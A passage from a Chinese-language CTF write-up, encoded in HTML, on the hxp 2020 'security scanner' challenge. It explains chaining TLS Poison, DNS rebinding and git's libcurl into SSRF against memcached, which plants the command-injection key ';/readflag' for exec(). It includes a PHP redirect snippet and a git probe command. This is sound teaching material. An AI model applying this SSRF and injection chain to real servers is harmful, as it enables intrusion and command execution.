src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/bad_workflow.png" alt></p><p>&#x8FD9;&#x6837;&#x9898;&#x76EE;&#x5728;&#x6267;&#x884C;&#x6211;&#x4EEC;&#x7684;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x5C31;&#x4E5F;&#x4F1A;&#x628A;&#x56DE;&#x663E;&#x663E;&#x793A;&#x7ED9;&#x6211;&#x4EEC;&#x4E86;&#xFF0C;&#x4E5F;&#x5C31;&#x62FF;&#x5230; FLAG &#x4E86;&#x3002;</p><p>&#x65E2;&#x7136;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x5F97;&#x60F3;&#x529E;&#x6CD5;&#x5982;&#x679C;&#x7ED5;&#x8FC7;&#x524D;&#x9762;&#x7684;&#x9A8C;&#x8BC1;&#x6B65;&#x9AA4;&#x3002;&#x4E3B;&#x8981;&#x9A8C;&#x8BC1;&#x4E5F;&#x5C31;&#x662F;&#x5982;&#x4E0B;&#x4E24;&#x4E2A;&#x6B65;&#x9AA4;&#xFF1A;</p><ul><li>&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#xFF1A;<code>^[0-9a-zA-Z:\.\/-]{1,64}</code>&#x3002;&#x8868;&#x8FBE;&#x5F0F;&#x6BD4;&#x8F83;&#x4E25;&#x683C;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x53EF;&#x4EE5;&#x8BA9;&#x6211;&#x4EEC;&#x8FDB;&#x884C;&#x547D;&#x4EE4;&#x6CE8;&#x5165;&#x7684;&#x673A;&#x4F1A;&#x3002;</li><li>&#x5373;&#x4F7F;&#x7ED5;&#x8FC7;&#x4E86;&#x6B63;&#x5219;&#xFF0C;&#x4F46;&#x662F;<code>file_get_contents</code>&#x5E76;&#x4E0D;&#x4F1A;&#x8BA4;&#x4E3A;<code>;/readflag</code>&#x662F;&#x5408;&#x6CD5;&#x534F;&#x8BAE;&#xFF0C;&#x4E5F;&#x4E0D;&#x80FD;&#x63A5;&#x7740;&#x53BB;&#x6267;&#x884C;&#x3002;</li></ul><p>&#x6240;&#x4EE5;&#x95EE;&#x9898;&#x5C31;&#x6765;&#x5230;&#x4E86;&#x5982;&#x4F55;&#x5C06;&#x6211;&#x4EEC;&#x7684; payload &#x5199;&#x5165; memcached &#x5F53;&#x4E2D;&#x4EE5;&#x53CA;&#x6211;&#x4EEC;&#x5982;&#x4F55;&#x7ED5;&#x8FC7;&#x524D;&#x9762;&#x4E24;&#x4E2A;&#x6B63;&#x5219;&#x3002;</p><p>&#x65E2;&#x7136;&#x662F;&#x8981;&#x5199;&#x5165; memcached &#x6211;&#x4EEC;&#x4E0D;&#x96BE;&#x60F3;&#x5230; 2020 &#x5E74; black hat &#x4E0A;&#x7684;&#x8BAE;&#x9898; When TLS Hack You &#xFF0C;&#x5176;&#x4E2D;&#x4F5C;&#x8005;&#x4F7F;&#x7528;&#x7684; demo &#x5C31;&#x662F;&#x901A;&#x8FC7; TLS &#x914D;&#x5408; DNS Rebinding &#x6765;&#x5BF9; memcached &#x53D1;&#x8D77; SSRF &#x653B;&#x51FB;&#xFF0C;&#x6240;&#x4EE5;&#x5982;&#x4F55;&#x5C06;&#x6211;&#x4EEC;&#x7684; payload &#x5199;&#x5165;&#x5230; memcached &#x5F53;&#x4E2D;&#x57FA;&#x672C;&#x6709;&#x4E86;&#x4E2A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x95EE;&#x9898;&#x662F;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x601D;&#x8DEF;&#x5462;&#xFF1F;</p><p>&#x6211;&#x4EEC;&#x518D;&#x6765;&#x770B;&#x770B;&#x5982;&#x679C;&#x771F;&#x662F;&#x4F7F;&#x7528; TLS Poison &#x653B;&#x51FB;&#x7684;&#x8BDD;&#xFF0C;&#x4F7F;&#x7528; HTTPS &#x662F;&#x4E0D;&#x662F;&#x5C31;&#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0A;&#x4E24;&#x4E2A;&#x9650;&#x5236;&#x7684;&#x6761;&#x4EF6;&#x4E86;&#x5462;&#xFF1F;&#x786E;&#x5B9E;&#x5982;&#x6B64;&#xFF0C;<code>https://</code>&#x5E76;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x5176;&#x4ED6;&#x7981;&#x6B62;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; HTTPS &#x8BA9;&#x9898;&#x76EE;&#x7684;<code>file_get_contents</code>&#x5F97;&#x5230;&#x4EFB;&#x610F;&#x5185;&#x5BB9;&#xFF0C;&#x5305;&#x62EC;&#x6EE1;&#x8DB3;&#x4ED6;&#x6240;&#x9700;&#x8981;&#x7684;<code>001e# service=git-upload-pack\n</code>&#x8FD9;&#x4E2A;&#x6761;&#x4EF6;&#x3002;</p><p>&#x6240;&#x4EE5;&#x4F3C;&#x4E4E;&#x770B;&#x8D77;&#x6765; TLS Poison &#x6B63;&#x662F;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x7684;&#x5173;&#x952E;&#xFF01;&#x5982;&#x679C;&#x662F;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x786E;&#x5B9A;&#xFF0C;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x4F7F;&#x7528; <code>file_get_contents</code>&#x8FD8;&#x662F; git &#x6765;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x5462;&#xFF1F;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x54EA;&#x4E00;&#x4E2A;&#x652F;&#x6301; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x77E5;&#x9053;<code>file_get_contents</code>&#x5E76;&#x6CA1;&#x6709;&#x4F9D;&#x8D56; libcurl &#xFF0C;&#x6211;&#x4EEC;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x67E5;&#x770B; PHP &#x6E90;&#x4EE3;&#x7801;&#x6709;&#x70B9;&#x9EBB;&#x70E6;&#xFF0C;&#x4E0D;&#x5982;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x8BA9;&#x5176;&#x8BBF;&#x95EE;&#x6211;&#x4EEC; TLS Poison Demo &#x6765;&#x6D4B;&#x8BD5;&#xFF0C;&#x5982;&#x679C;&#x80FD;&#x6709;&#x652F;&#x6301; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#xFF0C;&#x5728; 302 &#x65F6;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7B2C;&#x4E8C;&#x6B21;&#x8BBF;&#x95EE;&#x6211;&#x4EEC; TLS Server &#x5373;&#x4F1A;&#x5E26;&#x4E0A; Session ID &#xFF0C;&#x8FD9;&#x4E2A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528;wireshark &#x672C;&#x5730;&#x6293;&#x5305;&#x5373;&#x53EF;&#x770B;&#x5230;&#x4E86;&#x3002;&#x4F46;&#x662F;&#x7ECF;&#x8FC7;&#x6D4B;&#x8BD5;&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;<code>file_get_contents</code>&#x5E76;&#x6CA1;&#x6709;&#x5728;&#x7B2C;&#x4E8C;&#x6B21; TLS &#x4F1A;&#x8BDD;&#x65F6;&#x91CD;&#x7528; Session ID&#xFF0C;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000326.png" alt></p><p>&#x6240;&#x4EE5;&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5C31;&#x53EA;&#x80FD;&#x5BC4;&#x5E0C;&#x671B;&#x4E8E; git &#x4E86;&#xFF0C;&#x90A3;&#x4E48; git &#x662F;&#x5426;&#x652F;&#x6301; TLS &#x91CD;&#x7528;&#x4F1A;&#x8BDD;&#xFF1F;&#x600E;&#x4E48;&#x786E;&#x5B9A; git &#x662F;&#x5426;&#x652F;&#x6301; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x80FD;&#x4E0D;&#x80FD;&#x786E;&#x5B9A; git &#x4F7F;&#x7528;&#x7684;&#x662F;&#x4EC0;&#x4E48;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x8D44;&#x6E90;&#x4F9D;&#x8D56;&#x5E93;&#x5462;&#xFF1F;&#x6BD4;&#x5982; libcurl &#xFF1F;&#x5982;&#x679C;&#x662F; libcurl &#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x597D;&#x529E;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x660E;&#x786E;&#x77E5;&#x9053; libcurl &#x5BF9;&#x4E8E; HTTPS &#x7684;&#x652F;&#x6301;&#x662F;&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x7684;&#xFF0C;&#x81F3;&#x5C11;&#x5BF9;&#x4E8E; OpenSSL &#x6216;&#x8005; GnuTLS &#x6765;&#x8BF4;&#xFF0C;&#x90FD;&#x662F;&#x652F;&#x6301;&#x6B64;&#x9879;&#x7279;&#x6027;&#x7684;&#x3002;</p><p>&#x90A3;&#x4E48;&#x5230;&#x5E95;&#x5982;&#x4F55;&#x786E;&#x5B9A;&#x5462;&#xFF1F;&#x8FD9;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#x4E8E;&#x627E;&#x4E00;&#x4E2A;&#x7AD9;&#x70B9;&#x4F7F;&#x7528;&#x4E86;&#x4EC0;&#x4E48; web &#x6846;&#x67B6;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x901A;&#x8FC7;&#x627E;&#x7AD9;&#x70B9;&#x7279;&#x5F81;&#x3001;&#x62A5;&#x9519;&#x56DE;&#x663E;&#x7B49;&#x65B9;&#x5F0F;&#x6765;&#x786E;&#x5B9A;&#xFF0C;&#x4F46;&#x662F; git &#x53D1;&#x8D77;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x7684; User-Agent &#x4E2D;&#x53EA;&#x5E26;&#x4E86;&#x5B83;&#x81EA;&#x5DF1;&#x7684; UA &#x7279;&#x5F81;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x663E;&#x793A;&#x662F;&#x5426;&#x4F7F;&#x7528; libcurl &#xFF0C;&#x5728;&#x4EE3;&#x7801;&#x4E2D;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x627E;&#x5230;<code>&lt;curl/curl.h&gt;</code>&#xFF0C;&#x4F46;&#x662F;&#x5230;&#x5E95;&#x7528;&#x6CA1;&#x7528;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#x5224;&#x65AD;&#xFF1B;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x901A;&#x8FC7;&#x62A5;&#x9519;&#x56DE;&#x663E;&#x6765;&#x786E;&#x5B9A; git &#x5230;&#x5E95;&#x7528;&#x6CA1;&#x7528; libcurl (idea from @zsx )&#xFF0C;&#x5982;&#x4F55;&#x5F15;&#x8D77;&#x8FD9;&#x4E2A;&#x62A5;&#x9519;&#x5462;&#xFF1F;&#x4E0D;&#x96BE;&#x60F3;&#x5230;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x7528;&#x4E00;&#x4E2A; libcurl &#x4E0D;&#x652F;&#x6301;&#x7684;&#x534F;&#x8BAE;&#x6765;&#x786E;&#x5B9A;&#xFF0C;&#x6BD4;&#x5982; gopher &#x534F;&#x8BAE;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x81EA;&#x5DF1;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x653E;&#x4E00;&#x4E2A; php &#x8BA9;&#x5176; Location &#x8DF3;&#x8F6C;&#x5230; gopher &#x534F;&#x8BAE;&#x4E0A;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat 302.php                                                                                                                         </span><br><span class="line">&lt;?php                                                                                                                                                                   </span><br><span class="line">header(<span class="hljs-string">&quot;Location: gopher://localhost/&quot;</span>);</span><br><span class="line"></span><br><span class="line">$ git ls-remote --tags -- http://localhost/302.php                                                                                    </span><br><span class="line">fatal: unable to access <span class="hljs-string">&apos;http://localhost/302.php/&apos;</span>: Protocol <span class="hljs-string">&quot;gopher&quot;</span> not supported or disabled <span class="hljs-keyword">in</span> libcurl</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x660E;&#x663E;&#x7684; libcurl &#x9519;&#x8BEF;&#x56DE;&#x663E;&#x3002;</p><p>&#x65E2;&#x7136;&#x786E;&#x5B9A;&#x4E86;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; git &#x6765;&#x8FDB;&#x884C; TLS Poison &#x653B;&#x51FB; Memcached &#xFF0C;&#x90A3;&#x4E48;&#x5177;&#x4F53;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x8FD9;&#x4E48;&#x505A;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x4ECE; getFlag &#x5F00;&#x59CB;&#x6765;&#x770B;&#x770B;&#xFF1A;</p><ol><li>&#x8981;&#x8BA9;<code>exec</code>&#x6267;&#x884C;<code>;/readflag</code>&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x8BA9;<code>;/readflag</code>&#x5728; Memcached &#x4E2D;&#x7684; Value &#x4E3A; &#x201C;OK&#x201D;</li><li>&#x90A3;&#x600E;&#x4E48;&#x5199;&#x5165;<code>;/readflag</code>&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528; git &#x6765;&#x5B9E;&#x65BD; TLS Poison &#xFF0C;&#x5411; Memcached &#x4E2D;&#x5199;&#x5165; Key &#x4E3A;<code>;/readflag</code>&#xFF0C;Value &#x4E3A; &#x201C;OK&#x201D;</li><li>&#x90A3;&#x600E;&#x4E48;&#x5B9E;&#x65BD; TLS Poison &#x5462;&#xFF1F;&#x90E8;&#x7F72; HTTPS Server &#xFF0C;&#x5148;&#x7ED5;&#x8FC7;&#x4E4B;&#x524D;&#x4E24;&#x4E2A;&#x9650;&#x5236;&#xFF0C;&#x5728; git &#x8BF7;&#x6C42; HTTPS Server &#x7684;&#x65F6;&#x5019;&#x5B9E;&#x884C; TLS Poison</li></ol><p>&#x5177;&#x4F53;&#x6D41;&#x7A0B;&#x56FE;&#x5982;&#x4E0B;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/tls_poison.png" alt></p><p>&#x5176;&#x4E2D;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x53CC; A &#x8BB0;&#x5F55;&#x7684;&#x65B9;&#x6CD5;&#x6765;&#x4F18;&#x5316; DNS Rebinding &#x65B9;&#x5F0F;&#xFF0C;&#x5177;&#x4F53;&#x5173;&#x4E8E; TLS Poison &#x8BE6;&#x7EC6;&#x89E3;&#x91CA;&#x89C1;&#xFF1A;<a href="https://blog.zeddyu.info/2021/04/20/tls-poison/">&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x8BFB;&#x61C2; TLS Poison &#x653B;&#x51FB;</a></p><p>&#x8FD9;&#x91CC; wp &#x4F5C;&#x8005;&#x653E;&#x51FA;&#x7684; exp &#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x53EF;&#x7528;&#xFF0C;&#x5728; TLS &#x63E1;&#x624B;&#x65F6;&#x4F1A;&#x4EA7;&#x751F;&#x9519;&#x8BEF;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x53C8;&#x4E0D;&#x5F97;&#x4E0D;&#x4F7F;&#x7528;&#x5176;&#x4ED6;&#x5DE5;&#x5177;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A; exp &#xFF0C;&#x800C;&#x6574;&#x4E2A; exp &#x6784;&#x9020;&#x4E2D;&#x6BD4;&#x8F83;&#x5173;&#x952E;&#x7684;&#x5730;&#x65B9;&#x5728;&#x4E8E;&#xFF0C;&#x5982;&#x4F55;&#x8BA9;<code>file_get_contents</code>&#x6B63;&#x5E38;&#x83B7;&#x53D6;&#x5230;&#x6307;&#x5B9A;&#x5185;&#x5BB9;&#x540E;&#xFF0C;git 